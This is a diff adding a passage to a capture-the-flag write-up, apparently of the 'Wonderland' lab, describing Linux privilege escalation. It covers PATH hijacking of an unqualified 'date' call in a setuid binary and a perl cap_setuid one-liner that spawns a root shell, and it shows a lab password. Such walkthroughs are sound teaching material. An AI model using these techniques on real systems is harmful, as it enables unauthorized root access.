@@ -62,3 +62,37 @@ Finally the last thing I need to do is run the python file.
 
 <p><span style="color:red"><em>sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</em></span></p>
 
+Now that I was rabbit, I can starting looking around to see if there is anything else I can do to try and get root, luckily for me rabbit contained a file called teaParty. When you run strings on the file, this appears:
+
+```
+/bin/echo -n 'Probably by ' $$ date --date='next hour' -R
+```
+ This command grabs the current dtae and time then adds an hour to it. Since date is not called with a specified path, we are able to exploit that by first running the command:
+ 
+<p><span style="color:red"><em>export PATH=/tmp:$PATH</em></span></p>
+
+then 
+
+<p><span style="color:red"><em>echo $PATH</em></span></p>
+
+to ensure we did it correctly. 
+Next I created a shell script named date in the /tmp directory and made it executable by using the command:
+
+<p><span style="color:red"><em>chmod  +x /tmp/date</em></span></p>
+
+The code inside of the shell scirpt is just a simple:
+
+<p><span style="color:red"><em>#!/bin/bash /bin/bash</em></span></p>
+
+The only thing left to do know in order to gain access to hatter is to ./teaParty. After gaining access we can we that hatter contains a password.txt file.
+
+```
+WhyIsARavenLikeAWritingDesk?
+```
+
+Next using LinPEAS, a linux vulnerability scanner, I discovered that hatter has access to /usr/bin/pearl = cap_setuid+ep. Using the GTFObins exploit we gain root access. [GRFOBin](https://gtfobins.github.io/gtfobins/perl/)
+
+<p><span style="color:red"><em>perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+</em></span></p>
+
+After getting root access we can cat the root.txt and usr.txt files and complete the challenge. 
